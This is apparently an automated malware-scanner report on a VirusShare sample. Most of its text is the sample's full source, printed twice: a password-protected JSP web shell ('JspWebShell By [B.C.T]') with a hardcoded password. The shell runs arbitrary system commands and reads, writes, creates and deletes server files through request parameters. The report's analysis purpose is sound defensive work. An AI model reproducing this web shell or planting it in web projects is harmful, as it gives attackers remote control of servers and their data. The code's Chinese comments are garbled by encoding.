{
    "docinfo": {
        "attributes": [],
        "behavior": {
            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
            "System": "May run an executable file or a system command on a Mac",
            "exec": "May run an executable file or a system command using Excel 4 Macros",
            "mkdir": "May create a directory",
            "write": "May write to a file"
        },
        "macro": "<%@ page contentType=\"text/html; charset=GBK\" language=\"java\" \nimport=\"java.sql.*,java.io.File,java.io.*,\njava.nio.charset.Charset,java.io.IOException\" errorPage=\"\" %>\n<%\n\n String path=\"\";//\u00b7\ufffd\ufffd\n String selfName=\"\";//\ufffd\u00f5\ufffd\ufffd\ufffd\u01f0\ufffd\ufffdURL\ufffd\ufffd\ufffd\ufffd\u04aa\ufffd\ufffd\ufffd\u06b3\ufffd\ufffd\ufffd\ufffd\u04f5\ufffdURL\ufffd\u0139\ufffd\ufffd\ufffd \n%>\n<%  selfName=request.getRequestURI();\n     // String editfile=\"\";\n        String editfile=request.getParameter(\"editfile\");\n  if (editfile!=null)\n  {editfile=new String(editfile.getBytes(\"ISO8859_1\"));\n  }\n   path=request.getParameter(\"path\");\n  if(path==null)\n  path=config.getServletContext().getRealPath(\"/\");\n%>\n<%!    String _password =\"111\";//\ufffd\ufffd\ufffd\ufffd\ufffd\u07b8\u0134\ufffd\npublic String HTMLEncode(String str) {\n str = str.replaceAll(\" \", \" \");\n str = str.replaceAll(\"<\", \"<\");\n str = str.replaceAll(\">\", \">\");\n str = str.replaceAll(\"\\r\n\", \"<br>\");\n \n return str;\n}\n    public String exeCmd(String cmd) {\n Runtime runtime = Runtime.getRuntime();\n Process proc = null;\n String retStr = \"\";\n InputStreamReader insReader = null;\n char[] tmpBuffer = new char[1024];\n int nRet = 0;\n \n try {\n  proc = runtime.exec(cmd);\n  insReader = new InputStreamReader(proc.getInputStream(), Charset.forName(\"GB2312\"));\n  while ((nRet = insReader.read(tmpBuffer, 0, 1024)) != -1) {\n   retStr += new String(tmpBuffer, 0, nRet);\n  }\n  \n  insReader.close();\n  retStr = HTMLEncode(retStr);\n } catch (Exception e) {\n  retStr = \"<font color=\\\"red\\\">\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\\\"\" + cmd + \"\\\"\";\n } finally {\n  return retStr;\n }\n }\n public String readAllFile(String filePathName) throws IOException //\ufffd\ufffd\u0221\ufffd\u013c\ufffd\n { \n FileReader fr = new FileReader(filePathName); \n int count = fr.read();\n String res=\"\";\n while(count != -1) \n { \n //System.out.print((char)count); \n  res=res+(char)count;\n count = fr.read(); \n if(count == 13) \n { \n fr.skip(1); \n } \n } \n fr.close(); \n return res;\n } \npublic void writeFile(String filePathName,String args) throws IOException //\ufffd\u013c\ufffd\ufffd\ufffd\u0434\ufffd\ufffd\n{ \nFileWriter fw = new FileWriter(filePathName); \nPrintWriter out=new PrintWriter(fw); \nout.write(args); \nout.println(); \nout.flush(); \nfw.close(); \nout.close(); \n} \npublic boolean createFile(String filePathName) throws IOException //\ufffd\ufffd\ufffd\ufffd\ufffd\u013c\ufffd\n{ \nboolean result = false; \nFile file = new File(filePathName); \nif(file.exists()) \n{ \nSystem.out.println(\"\ufffd\u013c\ufffd\ufffd\u047e\ufffd\ufffd\ufffd\ufffd\u06a3\ufffd\"); \n} \nelse \n{ \nfile.createNewFile(); \nresult = true; \nSystem.out.println(\"\ufffd\u013c\ufffd\ufffd\u047e\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\"); \n} \nreturn result; \n}\npublic boolean createFolder(String fileFolderName) //\ufffd\ufffd\ufffd\ufffd\u013f\u00bc\n{ \nboolean result = false; \ntry \n{ \nFile file = new File(fileFolderName); \nif(file.exists()) \n{ \n//file.delete(); \nSystem.out.println(\"\u013f\u00bc\ufffd\u047e\ufffd\ufffd\ufffd\ufffd\ufffd!\"); \nresult = true; \n} \nelse \n{ \nfile.mkdir(); \nSystem.out.println(\"\u013f\u00bc\ufffd\u047e\ufffd\ufffd\ufffd\ufffd\ufffd!\"); \nresult = true; \n} \n} \ncatch(Exception ex) \n{ \nresult = false; \nSystem.out.println(\"CreateAndDeleteFolder is error:\"+ex); \n} \nreturn result; \n}  \n\npublic boolean DeleteFolder(String filefolderName) \n{ \nboolean result = false; \ntry \n{ \nFile file = new File(filefolderName); \nif(file.exists()) \n{ \nfile.delete(); \nSystem.out.println(\"\u013f\u00bc\ufffd\ufffd\u027e\ufffd\ufffd!\"); \nresult = true; \n} \n} \ncatch(Exception ex) \n{ \nresult = false; \nSystem.out.println(\"CreateAndDeleteFolder is error:\"+ex); \n} \nreturn result; \n} \npublic boolean validate(String password) {\n if (password.equals(_password)) {\n  return true;\n } else {\n  return false;\n }\n}\n%>\n\n<html>\n<head>\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=gb2312\">\n<title>JspWebShell By \ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd[B.C.T]</title>\n<style>\nbody {\n font-size: 12px;\n font-family: \"\ufffd\ufffd\ufffd\ufffd\";\n background-color: #666666;\n}\nA {\n COLOR: black; TEXT-DECORATION: none\n}\nA:hover {\n COLOR: black; TEXT-DECORATION: underline; none: \n}\ntd {\n font-size: 12px;\n font-family: \"\ufffd\ufffd\ufffd\ufffd\";\n color: #000000;\n}\n\ninput.textbox {\n border: black solid 1;\n font-size: 12px;\n height: 18px;\n}\n\ninput.button {\n font-size: 12px;\n font-family: \"\ufffd\ufffd\ufffd\ufffd\";\n border: black solid 1;\n}\n\ntd.datarows {\n font-size: 12px;\n font-family: \"\ufffd\ufffd\ufffd\ufffd\";\n height: 25px;\n color: #000000;\n}\n\ntextarea {\nborder: black solid 1;\n}\n.inputLogin {font-size: 9pt;border:1px solid lightgrey;background-color: lightgrey;}\n.table1 {BORDER:gray 0px ridge;}\n.td2 {BORDER-RIGHT:#ffffff 0px solid;BORDER-TOP:#ffffff 1px solid;BORDER-LEFT:#ffffff 1px solid;BORDER-BOTTOM:#ffffff 0px solid;BACKGROUND-COLOR:lightgrey; height:18px;}\n.tr1 {BACKGROUND-color:gray }\n</style>\n</head>\n<body><body bgcolor=\"#666666\">\n <%\n//session.setMaxInactiveInterval(_sessionOutTime * 60);\nString password=request.getParameter(\"password\");\nif (password == null && session.getAttribute(\"password\") == null) {\n//\ufffd\ufffd\u02be\ufffd\ufffd\u00bd\ufffd\ufffd\ufffd\ufffd\n%>\n\n<div align=\"center\" style=\"position:absolute;width:100%;visibility:show; z-index:0;left:4px;top:281px\"> \n  <TABLE class=\"table1\" cellSpacing=\"1\" cellPadding=\"1\" width=\"473\" border=\"0\" align=\"center\">\n    <tr> \n      <td class=\"tr1\"> <TABLE cellSpacing=\"0\" cellPadding=\"0\" width=\"468\" border=\"0\">\n          <tr> \n            <TD align=\"left\" bgcolor=\"#333333\"><FONT face=\"webdings\" color=\"#ffffff\"> 8</FONT><FONT face=\"Verdana, Arial, Helvetica, sans-serif\" color=\"#ffffff\"><b>JspWebShell \n              version 1.0\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u00bc :::...</b></font></TD>\n            <TD align=\"right\" bgcolor=\"#333333\"><FONT color=\"#d2d8ec\">Power By \n              </FONT></TD>\n          </tr>\n          <form name=\"bctform\" method=\"post\">\n            <tr bgcolor=\"#999999\"> \n              <td height=\"30\" colspan=\"2\" align=\"center\" class=\"td2\"> \n                <input name=\"password\" type=\"password\" class=\"textbox\" id=\"Textbox\" /> \n                <input type=\"submit\" name=\"Button\" value=\"Login\" id=\"Button\" title=\"Click here to login\" class=\"button\" /> \n              </td>\n            </tr>\n          </form>\n        </TABLE></td>\n    </tr>\n  </TABLE>\n</div>\n<%//\ufffd\ufffd\u02be\ufffd\ufffd\u00bd\ufffd\ufffd\ufffd\u06bd\ufffd\ufffd\ufffd\n  //\ufffd\ufffd\ufffd\ufffdSESSION  \ufffd\ufffd\u02be\ufffd\ufffd\u04b3\ufffd\ufffd\n } else {\n \n if (session.getAttribute(\"password\") == null) {\n  \n  if (validate(password) == false) {\n   out.println(\"<div align=\\\"center\\\"><font color=\\\"red\\\"><li>\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd</font></div>\");\n   out.close();\n   return;\n  }\n  \n  session.setAttribute(\"password\", password);\n } else {\n  password = (String)session.getAttribute(\"password\");\n }\n%>\n <%//\u027e\ufffd\ufffd//\ufffd\ufffd\u02be\ufffd\ufffd\ufffd\ufffd\u052a\n  File tmpFile = null;\n  String delfile=\"\";\n  String delfile1=\"\";\n  String editpath=\"\";\n  delfile1=request.getParameter(\"delfile\");\n  editpath=request.getParameter(\"filepath\");\n  if (delfile1!=null)\n  {delfile=new String(delfile1.getBytes(\"ISO8859_1\"));\n  }\n        if ( delfile1!= null) {\n        //  out.print(delfile);\n      tmpFile = new File(delfile);\n  if (! tmpFile.delete()) {\n   out.print( \"<font color=\\\"red\\\">\u027e\ufffd\ufffd\u02a7\ufffd\ufffd</font><br>\n\");\n   }\n   }\n%>\n  <%String editfilecontent=null;//\ufffd\ufffd\ufffd\ufffd\ufffd\u013c\ufffd\n       String editfilecontent1=request.getParameter(\"content\");\n    // out.println(editfilecontent1);\n  //String save=request.getParameter(\"save\");\n    if (editfilecontent1!=null)\n    {editfilecontent=new String(editfilecontent1.getBytes(\"ISO8859_1\"));}\n          //   out.print(editfile);\n   //out.print(editfilecontent);\n            if (editfile!=null&editfilecontent!=null)\n   {try {writeFile(editfile,editfilecontent);}\n    catch (Exception e) {out.print(\"\u0434\ufffd\ufffd\u02a7\ufffd\ufffd\");}\n    out.print(\"\u0434\ufffd\ufffd\u0279\ufffd\");\n   }\n   %>\n<%request.setCharacterEncoding(\"GBK\");%>\n<%//String editfile=request.getParameter(\"editfile\");\n//out.print(editfile);\nif (editfile!=null)//if edit\n{\n%>\n<div id=\"Layer1\" style=\"position:absolute; left:11px; top:330px; width:757px; height:250px; z-index:1\"> \n  <table width=\"99%\" height=\"232\" border=\"1\">\n    <tr> \n      <td height=\"226\"><form name=\"form2\" method=\"post\" action=\"\">\n          <p align=\"center\"> \ufffd\ufffd\u05b7\ufffd\ufffd\n            <input name=\"editfile\" type=\"text\" value=\"<%=editfile%>\" size=\"50\">\n          </p>\n          <p align=\"center\"> \n            <textarea name=\"content\" cols=\"105\" rows=\"30\"><%=readAllFile(editfile)%>"
    },
    "filename": "VirusShare_546ab0e7a62a66656dd48ff6132fc324",
    "filesize": 7977,
    "filetype": "HTML document, ISO-8859 text, with CRLF line terminators",
    "hashes": {
        "md5": "546ab0e7a62a66656dd48ff6132fc324",
        "sha1": "0478113aaf77796f6e7fa11b8ef57970890525d4",
        "sha256": "c04ae83034067e96705126ce076f4813b363538bac6e2a15fdf7a50ef4288fc5"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "<%@ page contentType=\"text/html; charset=GBK\" language=\"java\" ",
            "import=\"java.sql.*,java.io.File,java.io.*,",
            "java.nio.charset.Charset,java.io.IOException\" errorPage=\"\" %>",
            " String path=\"\";//",
            " String selfName=\"\";//",
            "\u01f0URL\u04aa\u06b3\u04f5URL\u0139 ",
            "<%  selfName=request.getRequestURI();",
            "     // String editfile=\"\";",
            "        String editfile=request.getParameter(\"editfile\");",
            "  if (editfile!=null)",
            "  {editfile=new String(editfile.getBytes(\"ISO8859_1\"));",
            "   path=request.getParameter(\"path\");",
            "  if(path==null)",
            "  path=config.getServletContext().getRealPath(\"/\");",
            "<%!    String _password =\"111\";//\u07b8\u0134",
            "public String HTMLEncode(String str) {",
            " str = str.replaceAll(\" \", \" \");",
            " str = str.replaceAll(\"<\", \"<\");",
            " str = str.replaceAll(\">\", \">\");",
            " str = str.replaceAll(\"\\r",
            "\", \"<br>\");",
            " return str;",
            "    public String exeCmd(String cmd) {",
            " Runtime runtime = Runtime.getRuntime();",
            " Process proc = null;",
            " String retStr = \"\";",
            " InputStreamReader insReader = null;",
            " char[] tmpBuffer = new char[1024];",
            " int nRet = 0;",
            " try {",
            "  proc = runtime.exec(cmd);",
            "  insReader = new InputStreamReader(proc.getInputStream(), Charset.forName(\"GB2312\"));",
            "  while ((nRet = insReader.read(tmpBuffer, 0, 1024)) != -1) {",
            "   retStr += new String(tmpBuffer, 0, nRet);",
            "  insReader.close();",
            "  retStr = HTMLEncode(retStr);",
            " } catch (Exception e) {",
            "  retStr = \"<font color=\\\"red\\\">\\\"\" + cmd + \"\\\"\";",
            " } finally {",
            "  return retStr;",
            " public String readAllFile(String filePathName) throws IOException //\u0221\u013c",
            " FileReader fr = new FileReader(filePathName); ",
            " int count = fr.read();",
            " String res=\"\";",
            " while(count != -1) ",
            " //System.out.print((char)count); ",
            "  res=res+(char)count;",
            " count = fr.read(); ",
            " if(count == 13) ",
            " fr.skip(1); ",
            " fr.close(); ",
            " return res;",
            "public void writeFile(String filePathName,String args) throws IOException //\u013c\u0434",
            "FileWriter fw = new FileWriter(filePathName); ",
            "PrintWriter out=new PrintWriter(fw); ",
            "out.write(args); ",
            "out.println(); ",
            "out.flush(); ",
            "fw.close(); ",
            "out.close(); ",
            "public boolean createFile(String filePathName) throws IOException //\u013c",
            "boolean result = false; ",
            "File file = new File(filePathName); ",
            "if(file.exists()) ",
            "System.out.println(\"\u013c\u047e\u06a3\"); ",
            "else ",
            "file.createNewFile(); ",
            "result = true; ",
            "System.out.println(\"\u013c\u047e\"); ",
            "return result; ",
            "public boolean createFolder(String fileFolderName) //\u013f",
            "boolean result = false; ",
            "try ",
            "File file = new File(fileFolderName); ",
            "if(file.exists()) ",
            "//file.delete(); ",
            "System.out.println(\"\u013f",
            "\u047e!\"); ",
            "result = true; ",
            "else ",
            "file.mkdir(); ",
            "System.out.println(\"\u013f",
            "\u047e!\"); ",
            "result = true; ",
            "catch(Exception ex) ",
            "result = false; ",
            "System.out.println(\"CreateAndDeleteFolder is error:\"+ex); ",
            "return result; ",
            "public boolean DeleteFolder(String filefolderName) ",
            "boolean result = false; ",
            "try ",
            "File file = new File(filefolderName); ",
            "if(file.exists()) ",
            "file.delete(); ",
            "System.out.println(\"\u013f",
            "\u027e!\"); ",
            "result = true; ",
            "catch(Exception ex) ",
            "result = false; ",
            "System.out.println(\"CreateAndDeleteFolder is error:\"+ex); ",
            "return result; ",
            "public boolean validate(String password) {",
            " if (password.equals(_password)) {",
            "  return true;",
            " } else {",
            "  return false;",
            "<html>",
            "<head>",
            "<meta http-equiv=\"Content-Type\" content=\"text/html; charset=gb2312\">",
            "<title>JspWebShell By [B.C.T]</title>",
            "<style>",
            "body {",
            " font-size: 12px;",
            " font-family: \"\";",
            " background-color: #666666;",
            " COLOR: black; TEXT-DECORATION: none",
            "A:hover {",
            " COLOR: black; TEXT-DECORATION: underline; none: ",
            "td {",
            " font-size: 12px;",
            " font-family: \"\";",
            " color: #000000;",
            "input.textbox {",
            " border: black solid 1;",
            " font-size: 12px;",
            " height: 18px;",
            "input.button {",
            " font-size: 12px;",
            " font-family: \"\";",
            " border: black solid 1;",
            "td.datarows {",
            " font-size: 12px;",
            " font-family: \"\";",
            " height: 25px;",
            " color: #000000;",
            "textarea {",
            "border: black solid 1;",
            ".inputLogin {font-size: 9pt;border:1px solid lightgrey;background-color: lightgrey;}",
            ".table1 {BORDER:gray 0px ridge;}",
            ".td2 {BORDER-RIGHT:#ffffff 0px solid;BORDER-TOP:#ffffff 1px solid;BORDER-LEFT:#ffffff 1px solid;BORDER-BOTTOM:#ffffff 0px solid;BACKGROUND-COLOR:lightgrey; height:18px;}",
            ".tr1 {BACKGROUND-color:gray }",
            "</style>",
            "</head>",
            "<body><body bgcolor=\"#666666\">",
            "//session.setMaxInactiveInterval(_sessionOutTime * 60);",
            "String password=request.getParameter(\"password\");",
            "if (password == null && session.getAttribute(\"password\") == null) {",
            "<div align=\"center\" style=\"position:absolute;width:100%;visibility:show; z-index:0;left:4px;top:281px\"> ",
            "  <TABLE class=\"table1\" cellSpacing=\"1\" cellPadding=\"1\" width=\"473\" border=\"0\" align=\"center\">",
            "    <tr> ",
            "      <td class=\"tr1\"> <TABLE cellSpacing=\"0\" cellPadding=\"0\" width=\"468\" border=\"0\">",
            "          <tr> ",
            "            <TD align=\"left\" bgcolor=\"#333333\"><FONT face=\"webdings\" color=\"#ffffff\"> 8</FONT><FONT face=\"Verdana, Arial, Helvetica, sans-serif\" color=\"#ffffff\"><b>JspWebShell ",
            "              version 1.0",
            " :::...</b></font></TD>",
            "            <TD align=\"right\" bgcolor=\"#333333\"><FONT color=\"#d2d8ec\">Power By ",
            "              </FONT></TD>",
            "          </tr>",
            "          <form name=\"bctform\" method=\"post\">",
            "            <tr bgcolor=\"#999999\"> ",
            "              <td height=\"30\" colspan=\"2\" align=\"center\" class=\"td2\"> ",
            "                <input name=\"password\" type=\"password\" class=\"textbox\" id=\"Textbox\" /> ",
            "                <input type=\"submit\" name=\"Button\" value=\"Login\" id=\"Button\" title=\"Click here to login\" class=\"button\" /> ",
            "              </td>",
            "            </tr>",
            "          </form>",
            "        </TABLE></td>",
            "    </tr>",
            "  </TABLE>",
            "</div>",
            "<%//\u02be",
            "  //SESSION  \u02be\u04b3",
            " } else {",
            " if (session.getAttribute(\"password\") == null) {",
            "  if (validate(password) == false) {",
            "   out.println(\"<div align=\\\"center\\\"><font color=\\\"red\\\"><li></font></div>\");",
            "   out.close();",
            "   return;",
            "  session.setAttribute(\"password\", password);",
            " } else {",
            "  password = (String)session.getAttribute(\"password\");",
            " <%//\u027e//\u02be\u052a",
            "  File tmpFile = null;",
            "  String delfile=\"\";",
            "  String delfile1=\"\";",
            "  String editpath=\"\";",
            "  delfile1=request.getParameter(\"delfile\");",
            "  editpath=request.getParameter(\"filepath\");",
            "  if (delfile1!=null)",
            "  {delfile=new String(delfile1.getBytes(\"ISO8859_1\"));",
            "        if ( delfile1!= null) {",
            "        //  out.print(delfile);",
            "      tmpFile = new File(delfile);",
            "  if (! tmpFile.delete()) {",
            "   out.print( \"<font color=\\\"red\\\">\u027e\u02a7</font><br>",
            "   }",
            "   }",
            "  <%String editfilecontent=null;//\u013c",
            "       String editfilecontent1=request.getParameter(\"content\");",
            "    // out.println(editfilecontent1);",
            "  //String save=request.getParameter(\"save\");",
            "    if (editfilecontent1!=null)",
            "    {editfilecontent=new String(editfilecontent1.getBytes(\"ISO8859_1\"));}",
            "          //   out.print(editfile);",
            "   //out.print(editfilecontent);",
            "            if (editfile!=null&editfilecontent!=null)",
            "   {try {writeFile(editfile,editfilecontent);}",
            "    catch (Exception e) {out.print(\"\u0434\u02a7\");}",
            "    out.print(\"\u0434\u0279\");",
            "   }",
            "   %>",
            "<%request.setCharacterEncoding(\"GBK\");%>",
            "<%//String editfile=request.getParameter(\"editfile\");",
            "//out.print(editfile);",
            "if (editfile!=null)//if edit",
            "<div id=\"Layer1\" style=\"position:absolute; left:11px; top:330px; width:757px; height:250px; z-index:1\"> ",
            "  <table width=\"99%\" height=\"232\" border=\"1\">",
            "    <tr> ",
            "      <td height=\"226\"><form name=\"form2\" method=\"post\" action=\"\">",
            "          <p align=\"center\"> \u05b7",
            "            <input name=\"editfile\" type=\"text\" value=\"<%=editfile%>\" size=\"50\">",
            "          </p>",
            "          <p align=\"center\"> ",
            "            <textarea name=\"content\" cols=\"105\" rows=\"30\"><%=readAllFile(editfile)%>"
        ],
        "file": {},
        "fuzzing": {},
        "ip": [],
        "url": []
    },
    "time": "0:00:00.333407",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": []
}
